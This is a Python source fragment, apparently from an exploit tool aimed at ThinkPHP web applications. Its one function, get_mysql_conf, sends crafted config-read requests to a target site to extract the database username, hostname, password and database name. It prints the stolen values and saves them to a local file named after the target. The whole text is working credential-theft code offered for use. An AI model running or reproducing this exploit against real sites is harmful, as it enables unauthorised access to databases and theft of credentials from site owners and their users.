import requests
from urllib import parse
import urllib3
import base64
import argparse
import time
import random
import sys
from bs4 import BeautifulSoup


def get_mysql_conf(host):
    fo = open('{}.txt'.format(parse.urlparse(host).hostname), 'a')
    headers['Host'] = parse.urlparse(host).hostname
    print('\x1b[1;34m[!] 尝试获取数据库配置:\x1b[0m')
    mysql_success = False
    try:
        name = requests.get(url=(host + '/?s=index/think\\config/get&name=database.username'), headers=headers, timeout=5, verify=False, allow_redirects=False)
        hostname = requests.get(url=(host + '/?s=index/think\\config/get&name=database.hostname'), headers=headers, timeout=5, verify=False, allow_redirects=False)
        password = requests.get(url=(host + '/?s=index/think\\config/get&name=database.password'), headers=headers, timeout=5, verify=False, allow_redirects=False)
        database = requests.get(url=(host + '/?s=index/think\\config/get&name=database.database'), headers=headers, timeout=5, verify=False, allow_redirects=False)
        if ((len(name.text) > 0) and (len(name.text) < 100)):
            fo.write('database username: {}\n'.format(name.text))
            print(('\x1b[1;32m[+] database username: \x1b[0m' + name.text))
            mysql_success = True
        if ((len(hostname.text) > 0) and (len(hostname.text) < 100)):
            fo.write('database hostname: {}\n'.format(hostname.text))
            print(('\x1b[1;32m[+] database hostname: \x1b[0m' + hostname.text))
        if ((len(password.text) > 0) and (len(password.text) < 100)):
            fo.write('database password: {}\n'.format(password.text))
            print(('\x1b[1;32m[+] database password: \x1b[0m' + password.text))
        if ((len(database.text) > 0) and (len(database.text) < 100)):
            fo.write('database name: {}\n'.format(database.text))
            print(('\x1b[1;32m[+] database name: \x1b[0m' + database.text))
        if (not mysql_success):
            print('\x1b[1;31m[!] 数据库配置获取失败\x1b[0m')
    except:
        pass
    fo.close()
